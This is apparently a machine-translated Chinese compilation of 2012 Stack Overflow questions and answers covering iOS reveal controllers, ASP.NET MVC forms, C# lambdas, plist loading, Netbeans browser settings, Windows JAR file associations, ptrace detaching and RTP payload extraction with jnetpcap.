                     ButtonBuilder.create().minHeight(40.0).minWidth(40.0);
    Button button1 = builder.onAction(clickHandler).build(); 
```

# iphone - ZUUIRevealController 与 UITabBarController 而不是 UINavigationController

> ID：10446972
> 
> 赞同：1
> 
> 时间：2012-05-04T10:22:47.977
> 
> 标签：iphone, ios, tabbar

我正在尝试将 ZUUIRevealController 实现到我的项目中，该应用程序使用带有 3 个选项卡的 UITabBarController。

我多次浏览了截屏视频和示例代码，但我不知道为什么

```
[self.navigationController.parentViewController respondsToSelector:@selector(revealToggle)] 
```

只回应假。

在我的 appdelegate 中，我只创建了一个简单的 UITabBarController 并添加为 rootViewController：

```
UITableViewController *activityViewController = [[[ActivityViewController alloc] initWithNibName:@"ActivityViewController" bundle:nil] autorelease];
UIViewController *agendaViewController = [[[AgendaViewController alloc] initWithNibName:@"AgendaViewController" bundle:nil] autorelease];
UIViewController *settingsViewController = [[[SettingsViewController alloc] initWithNibName:@"SettingsViewController" bundle:nil] autorelease];

UINavigationController *activityNavController = [[[UINavigationController alloc] initWithRootViewController:activityViewController] autorelease];
UINavigationController *agendaNavController = [[[UINavigationController alloc] initWithRootViewController:agendaViewController] autorelease];
UINavigationController *settingsNavController = [[[UINavigationController alloc] initWithRootViewController:settingsViewController] autorelease];

self.tabBarController = [[UITabBarController alloc] init];
self.tabBarController.viewControllers = [NSArray arrayWithObjects:activityNavController, agendaNavController, settingsNavController, nil];

SortViewController *sortViewController = [[SortViewController alloc] init];    
ZUUIRevealController *revealController = [[ZUUIRevealController alloc] initWithFrontViewController:self.tabBarController rearViewController:sortViewController];
[sortViewController release];

//self.window.rootViewController = self.tabBarController;
self.window.rootViewController = revealController;

[revealController release];

[self.window makeKeyAndVisible]; 
```

但是当我在我的 ActivityViewController 中进行检查时，我只会得到错误

```
if([self.tabBarController.parentViewController respondsToSelector:@selector(revealToggle)]) 
{
    NSLog(@"YAY");
}
else 
{
    NSLog(@"WRONG");
} 
```

在截屏视频中看起来很简单，但看起来我错过了一些东西。

ZUUIRevealController：[https ://github.com/pkluz/ZUUIRevealController](https://github.com/pkluz/ZUUIRevealController)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T10:58:53.267

只需**`:`**在您检查***`respondsToSelector:`***like时放入 if 语句

```
if([self.tabBarController.parentViewController respondsToSelector:@selector(revealToggle:)]) 
```

# asp.net-mvc-3 - 需要在 Html.BeginForm() 中放入哪些参数

> ID：10446976
> 
> 赞同：-2
> 
> 时间：2012-05-04T10:22:58.150
> 
> 标签：asp.net-mvc-3

我有以下看法：

```
<h2>enter the student name to search</h2>

@using (Html.BeginForm())
{
  <label>Search:</label>
  <input type="text" name="searchString" />
  <input type="submit" name="submit" />
} 
```

并且视图对应于以下控制器

```
namespace Searching.Controllers
{ 
   public class SearchController : Controller
   //somecode

   [HttpPost] 
   public ActionResult SearchIndex(FormCollection formCollection)
   {
      string searchString=formCollection["searchString"];
      var search = from m in db.Searches select m;
      if (!String.IsNullOrEmpty(searchString))
      {
        search = search.Where(s => s.Name.Contains(searchString));
      }
      return View(search);
    }
  }
} 
```

控制器名称是 SearchController.cs，传递表单的方法名称是 SearchIndex。Html.BeginForm() 中的参数应该是什么。我是初学者。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T10:42:34.863

```
Html.BeginForm("SearchIndex", "Search", .....) 
```

您应该阅读以下内容：http: [//msdn.microsoft.com/en-us/library/dd410596.aspx](http://msdn.microsoft.com/en-us/library/dd410596.aspx)

# c# - () => {} 是什么意思？

> ID：10446980
> 
> 赞同：5
> 
> 时间：2012-05-04T10:23:24.653
> 
> 标签：c#

我正在阅读 Pulling the switch [here](http://simpleprogrammer.com/2010/08/17/pulling-out-the-switch-its-time-for-a-whooping/)并遇到了这段代码。

somoone 可以解释一下什么是`() => {}`什么，我应该阅读什么来理解那行代码？

```
var moveMap = new Dictionary<string, Action>()
{
    {"Up", MoveUp},
    {"Down", MoveDown},
    {"Left", MoveLeft},
    {"Right", MoveRight},
    {"Combo", () => { MoveUp(); MoveUp(); MoveDown(); MoveDown(); }}
};

moveMap[move](); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-04T10:25:31.493

这是一个[lambda 表达式](http://msdn.microsoft.com/en-us/library/bb397687.aspx)：

> 所有 lambda 表达式都使用 lambda 运算符`=>`，读作“goes to”。lambda 运算符的左侧指定输入参数（如果有），右侧保存表达式或语句块

基本上，您在这里构建一个新的临时函数，它只调用其他两个函数的组合。

如上所示，`()`左侧的 表示它有一个空参数列表（就像您的其他函数一样）。右边的`{}`意思是它在一个块内执行几个语句，这使它成为一个“语句 lambda”，它被称为它的副作用，与计算一个值的“表达式 lambda”形成对比。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-04T10:25:12.310

这是一个[lambda 表达式](http://msdn.microsoft.com/en-us/library/bb397687.aspx)。MSDN 将其称为“语句 lambda”：

> 语句 lambda 类似于表达式 lambda，只是语句用大括号括起来。

字典包含一组`Actions`（代表）。4个是明确定义的，第5个是一个匿名函数，它调用其他的2个。最后一行代码调用了一个 Action（它通过键从字典中检索委托并调用它）。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-04T10:25:52.290

`() => {/*code*/}`是一个*lambda 表达式*，一种创建接受零参数的匿名委托的便捷方式。本质上，它创建了一段可调用的代码，在您的情况下，该代码向上移动两次，然后向下移动两次。

您不仅限于没有参数的 lambda - 您可以创建带参数的 lambda：

```
Action<string> callable = (name) => {Console.WriteLine("Hello, {0}!", s);};
callable("world");
callable("quick brown fox"); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-05-04T10:26:55.657

`()`这是没有参数的匿名函数

`=>`是 lambda 运算符（发音为 Goes to ）

字典已经用 KeyValuePair 初始化，最后一个选项是一个匿名函数，它不带参数并调用其他函数

# objective-c - arrayWithFile 返回计数 0

> ID：10446981
> 
> 赞同：0
> 
> 时间：2012-05-04T10:23:28.823
> 
> 标签：objective-c, xcode, nsmutablearray

我正在编写一个将 plist 复制到 docsdir 中然后将其读入可变数组的应用程序。但是，下面的代码返回数组的计数为 0。但是，带有字典日志的行会返回正确的项目。我还验证了该文件正在被复制到 docsdir。

```
-(NSString *)docsDir {
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
}

- (void)viewDidLoad
{
    [super viewDidLoad];

    NSString *listPath = [[self docsDir]stringByAppendingPathComponent:@"list.plist"];
    if (![[NSFileManager defaultManager]fileExistsAtPath:listPath]) {
        [[NSFileManager defaultManager]copyItemAtPath:[[NSBundle mainBundle]pathForResource:@"list" ofType:@"plist"] toPath:listPath error:nil];
        NSLog(@"Chicken");
    }

    NSLog(@"%@", [NSDictionary dictionaryWithContentsOfFile:listPath]);
    _array = [NSArray arrayWithContentsOfFile:listPath];

    NSLog(@"Count: %i", [_array count]);

}

- (void)viewDidUnload
{
    [super viewDidUnload];
    / / Release any retained subviews of the main view.
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return (interfaceOrientation != UIInterfaceOrientationPortraitUpsideDown);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T11:30:59.250

通常这是因为默认情况下 plist 文件中的根元素是字典。

右键单击并选择**Open as Source Code**，您的文件可能如下所示：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>foo</key>
    <array>
        <string>foo1</string>
        <string>foo2</string>
        <string>foo3</string>
    </array>
</dict>
</plist> 
```

其中根元素是一个字典，将其更改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
    <string>foo1</string>
    <string>foo2</string>
    <string>foo3</string>
</array>
</plist> 
```

其中根元素是一个数组。您现在可以像往常一样进行编辑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:34:55.947

使用 Xcode 打开 plist 文件。

只需在左上角和`Type`plist 中找到“键”。

![示例 Plist 文件](../Images/617a3ecb630817d083c300be23b6d4b7.png)

确保`Type`是数组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:58:21.053

我认为您的 plist 是一个包含数组的字典。
试试这个

```
NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:listPath]
NSArray *array = [dict objectForKey:@"key"]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T13:49:28.263

Plists 通常保存在字典中：

这是一个例子：

```
<dict>
    <key>tiltingAnim</key>
    <dict>
        <key>filenamePrefix</key>
        <string>radar_</string>
        <key>delay</key>
        <real>0.25</real>
        <key>animationFrames</key>
        <string>1,2,3,4,5,5,4,3,2,1,2,3,4,5</string>
    </dict>
    <key>takingAHitAnim</key>
    <dict>
        <key>filenamePrefix</key>
        <string>radar_</string>
        <key>delay</key>
        <real>0.1</real>
        <key>animationFrames</key>
        <string>5,5,7,8,8</string>
    </dict>
    <key>blowingUpAnim</key>
    <dict>
        <key>filenamePrefix</key>
        <string>radar_</string>
        <key>delay</key>
    <real>0.2</real>
    <key>animationFrames</key>
    <string>5,6,7,8,9,10,11,12,13,14,15,16,17</string>
    </dict>
    <key>transmittingAnim</key>
    <dict>
        <key>filenamePrefix</key>
        <string>radar_</string>
        <key>delay</key>
        <real>0.3</real>
        <key>animationFrames</key>
        <string>5,6,5,6,5,6,5</string>
    </dict>
</dict> 
```

现在，您的问题有两种解决方案。

1.  要么将内容放入字典，然后取出特定键的数组。
2.  使用文本编辑器打开 plist 并将 root 键更改为然后将 root 更改为 . 如果您的 plist 是静态的并且在捆绑资源中，那么您可以这样做，但如果它是您的代码生成的 plist，那么我不推荐这样做。

# configuration - 在 Netbeans 6.9.1 中更改我的网络浏览器

> ID：10446982
> 
> 赞同：14
> 
> 时间：2012-05-04T10:23:29.417
> 
> 标签：configuration, netbeans-6.9

我有 Netbeans 6.9.1，我想将默认浏览器更改为 Chrome。我看到一个线程说 Netbeans 6.5，它可以配置，`Tools > Options > General`但问题是我在我的工具选项卡中找不到选项，因为我没有使用那个版本。任何人都知道如何使用 Netbeans 6.9.1 做到这一点？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-05-04T10:30:20.187

在文件`C:\Program Files\NetBeans 6.8\etc\netbeans.conf`中，将以下行添加到`netbeans_default_options`属性中：

```
-J-Dorg.netbeans.modules.extbrowser.UseDesktopBrowse=true 
```

然后将 Chrome 设置为默认浏览器。

* * *

**替代方法（使用 Netbeans 7.1 尝试过）：**

打开`Tools > Options`，你应该看到这个：

![Netbeans 选项对话框](../Images/be2fd9b33bb9706eb8a83cd7892795bd.png)

单击编辑按钮。然后点击添加按钮。将显示一个名为“外部浏览器”的新浏览器。您可以将其重命名为 Chrome，然后将“进程”字段更改为如下路径：

> C:\Users\{User}\AppData\Local\Google\Chrome\Application\chrome.exe（在我的 Windows 7 上）

在您的情况下，您可以右键单击 Chrome 图标并选择属性选项（Windows），然后查看目标路径在哪里。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-03-27T01:21:19.583

如果有人遇到 Netbeans 8.2 的相同问题：它在

运行 > 设置项目浏览器 > Chrome

[![在此处输入图像描述](../Images/5cec7acc0f0b76b03396ec6ac066df1a.png)](https://i.stack.imgur.com/VM8vz.png)

（当然你可以选择其他浏览器！）

# java - 双击 JAR 文件不会打开命令提示符

> ID：10446986
> 
> 赞同：6
> 
> 时间：2012-05-04T10:23:51.183
> 
> 标签：java, jar, executable-jar

我想通过双击运行一个 Jar 文件。

以下是其中存在的唯一 Java 类文件。

```
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
public class Sysout{
public static void main(String[] args) throws IOException{
    System.out.println("Hello World!");
    BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
    String msg = br.readLine();
    System.out.println(msg);
    br.read();
}
} 
```

Manifest 文件定义了 Main-Class。

使用[此](https://stackoverflow.com/questions/2622062/batch-file-command-to-run-jar-file)链接，我通过双击批处理文件成功运行了 Jar 文件。这将打开命令提示符并运行定义的主类。

但是，如果我直接双击 Jar 文件，什么也不会发生。我还检查了[这个](https://stackoverflow.com/questions/8511063/how-to-run-jar-file-by-double-click-on-windows-7-64)链接并将我的 .jar 与 javaw.exe 相关联 。[这个](https://stackoverflow.com/questions/5428079/could-not-find-the-main-class-when-double-clicking-jar-file)链接也暗示了同样的情况。还尝试通过将 .jar 与 java.exe 相关联

发生的情况是命令提示符打开了几分之一秒然后消失了。

即使我期望用户输入一些数据，双击操作也不会等待用户输入任何内容。

问题出在哪里？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-04T10:35:50.710

当您使用`javaw`关联时，它不会创建命令窗口，并吞下所有`System.out`和`System.err`调用。

您应该将您的`.jar`文件与`java`二进制文件重新关联，该二进制文件应显示必要的命令窗口。

如果您使用 simple`Open With...`选项，它将`-jar`从命令行中省略该选项。

打开管理员命令窗口（如果您使用启用了 UAC 的 Vista 或 Windows 7，则需要此窗口）并执行以下操作：

```
assoc .jar=jarfileterm
ftype jarfileterm="C:\Program Files\Java\jre7\bin\java.exe" -jar "%1" %* 
```

在您的情况下，您应该将`C:\Program Files\Java\jre7\bin\java.exe`路径替换为安装 jre 的路径。

当您双击此操作时，它应该可以正常运行。

您可以添加另一个 ftype：

```
ftype jarfile="C:\Program Files\Java\jre7\bin\javaw.exe" -jar "%1" %* 
```

再次用适用于您系统的路径替换 javaw 二进制文件的路径。

您现在应该能够通过交替选择`assoc .jar=jarfileterm`和`assoc .jar=jarfile`

如果你想在运行 .jar 之后保留命令窗口，那么你可以在 java 命令的调用中加上一个`cmd /s /k`viz：

```
ftype jarfileterm=cmd /s /k ""C:\Program Files\Java\jre7\bin\java.exe" -jar "%1" %*"
assoc .jar=jarfileterm 
```

如果这些命令有效，则双击 jar 文件将导致命令窗口弹出并持续存在。

您无法设置足够复杂的命令行，`Open With...`或者使用`Default Programs`它将允许 jar 文件运行。如果您已成功尝试了所有这些努力`ftype`和`assoc`命令，但仍然无法正常工作，那么您将需要剥离注册表编辑器。

启动`regedit`，并在下面搜索一个名为 .jar 的键`HKEY_CLASSES_ROOT`- 这应该会导致它下面的单个值调用`(Default)`一个值，如果您的 ftype 命令调用有效，那么它应该读取`jarfileterm`. 如果它不起作用，那么您正在查看可能已由另一个应用程序创建的关联（我不知道 java 更新程序是否替换了这些条目，但如果确实如此，那么这可能是问题所在）

您接下来需要在`HKEY_CLASSES_ROOT`. 它会找到这个条目，它应该包含一个键`Shell`（即展开文件夹`jarfileterm`，它应该显示另一个文件夹`Shell`），它包含一个键，该键`Open`包含一个键，该键`Command`包含一个`(Default)`值，该值应该包含用于启动 .jar 文件的调用命令。此命令应与`ftype jarfileterm=...`您输入的最后一个条目匹配。如果不匹配，则应使其与`cmd /s /k`“c:\program files\java\jre7\bin\java.exe”选项之一匹配（取决于您是否想要在启动或不启动错误的情况下保留命令窗口）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T10:33:52.907

可能是您的 .jar 文件已与任何其他默认程序绑定，右键单击并使用“Java(TM) Platform SE binary”打开。如果有可执行的 jar 文件，这应该可以工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-08-11T10:38:33.947

我正在使用 JDK`jar`在 Windows 10 中打开文件。

1.  打开 regedit → HKEY_CLASSES_ROOT\jarfile\shell\open\command
2.  将默认值从 更改`javaw`为`java`

例如，我的是`"C:\Program Files\Java\jdk-14.0.1\bin\java.exe" "-jar" "%1"`

# c - ptrace_detach、SIGINT 和跟踪/断点陷阱（核心转储）

> ID：10446993
> 
> 赞同：4
> 
> 时间：2012-05-04T10:24:06.820
> 
> 标签：c, unix, ptrace

我正在尝试在程序运行时跟踪它：with `ptrace(PTRACE_ATTACH, ...)`, `ptrace(PTRACE_SINGLESTEP, ...)`, 等等。

一切似乎都很好，但是当我用 退出我的跟踪程序时`CTRL-C`，我想将它（用`PTRACE_DETACH`）从被跟踪程序中分离出来，当我执行这个操作时，被跟踪程序崩溃并出现错误`Trace/BPT trap (core dumped)`。

我的问题是：**如何在不使跟踪程序崩溃的情况下正确分离？**

这是捕获`SIGINT`信号的函数：

```
void sig_int()
{
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
        my_perror("ptrace / DETACH", strerror(errno));
} 
```

编辑：

这是其他一些代码：

```
if ((ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1))                                                                                                 
   my_perror("ptrace / SINGLESTEP", strerror(errno));
if (wait4(pid, &(l->status), 0, 0) == -1)
   my_perror("wait4", strerror(errno));
if (ptrace(PTRACE_GETREGS, pid, 0, &(l->reg)) == -1)
   my_perror("ptrace / GETREGS", strerror(errno));
if ((l->opcode = ptrace(PTRACE_PEEKTEXT, pid, l->reg.rip, NULL)) == -1)
   my_perror("ptrace / PEEKTEXT", strerror(errno)); 
```

这是我循环的一部分，我在其中进行跟踪的第一部分

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-07T07:51:22.870

好的，我的问题已经解决了，新函数捕获 SIGINT：

```
void            int_sig()
 {
  if (stop == 0)
    {
      printf("Interrupting!\n");
      ptrace(PTRACE_CONT, pid, NULL, NULL);
      exit(0);
    }
 } 
```

这个名为 'stop' 的新变量是什么？

好吧，当我知道我的下一个单步是否是系统调用之后，让我们在我的单步执行和 getregs 连续第二次返回我的代码。我这样做是为了获得 syscall 的返回值：

```
void            do_step(t_list *l)                                                                                                                        
{
  if ((ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1))
   my_perror("ptrace / SINGLESTEP", strerror(errno));
  if (wait4(pid, &(l->status), 0, 0) == -1)
    my_perror("wait4", strerror(errno));
 if (ptrace(PTRACE_GETREGS, pid, 0, &(l->reg)) == -1)
  my_perror("ptrace / GETREGS", strerror(errno));
 if ((l->opcode = ptrace(PTRACE_PEEKTEXT, pid, l->reg.rip, NULL)) == -1)
   my_perror("ptrace / PEEKTEXT", strerror(errno));
}

void            do_next_step(t_list *l, t_strace *t)
 {
  stop = 1;
  if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1 ||
      (wait4(pid, &(l->status), 0, 0) == -1))
     my_perror("ERROR", strerror(errno));
  if (!WIFSTOPPED(l->status) || WIFEXITED(l->status))
     {
       printf("?\n");
      exit(0);
    }
 if (ptrace(PTRACE_GETREGS, pid, 0, &(l->reg)) == -1)
   my_perror("ptrace / GETREGS", strerror(errno));
 if (t->ret == 1)
  printf("%d\n", (int)l->reg.rax);
   else
    printf("%#lx\n", l->reg.rax);
   stop = 0;
 } 
```

我发现如果我在 do_next_step 函数中试图中断我的跟踪程序，这会使跟踪程序崩溃！

因此，如果我在“do_next_step”函数中，我会在 int_sig() 中放置一个标志来跳过该操作！

希望将来会有所帮助和/或有趣！

非常感谢那些在这个问题上一直帮助我的人！干杯！！！

# java - jnetpcap 保存 rtp 有效负载：两个通道

> ID：10446996
> 
> 赞同：1
> 
> 时间：2012-05-04T10:24:15.670
> 
> 标签：java, rtp, jnetpcap

我正在使用 Wireshark 的 tshark 和 jnetpcap 的组合来解码离线捕获并从文件中提取 rtp 音频有效负载以用于正向和反向。

在第一步中，我只隔离 rtp 文件并将它们保存到一个额外的文件中。

然后我只需使用 jnetpcap 循环遍历该文件并将 rtp 有效负载保存到文件中。

如果我需要两个通道，则可以播放生成的文件，但采样等无法正常工作。听起来有点太快（太高）。所以必须做一些不同的事情..

有人知道如何将它保存到 2 个通道中，以便它作为立体声而不是单声道工作吗？

```
final StringBuilder errbuf = new StringBuilder();

    Pcap pcap = Pcap.openOffline(filename, errbuf);

    if(pcap == null) {
        System.err.printf("Error while opening device for capture: " 
                + errbuf.toString());

        return false;
    }

    PcapPacketHandler<String> handler = new PcapPacketHandler<String>() {
        public void nextPacket(PcapPacket packet, String user) {
            System.out.println("size of packet is=" + packet.size());
            Rtp rtp = new Rtp();

            if(packet.hasHeader(rtp)) {
                System.out.println("rtp.headerLength = "+rtp.getHeaderLength()+ "rtp.payloadLength = "+rtp.getPayloadLength());

                try {
                    dos.write(rtp.getPayload());
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }

        }
    };

    int ret = pcap.dispatch(-1, handler, "I rock");
    System.out.println("Ret = "+ret);
    try {
        dos.close();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T07:00:27.473

该问题的解决方案是构建一个 RingBuffer 作为 jitterbuffer 并同步包并进行适当的静音生成。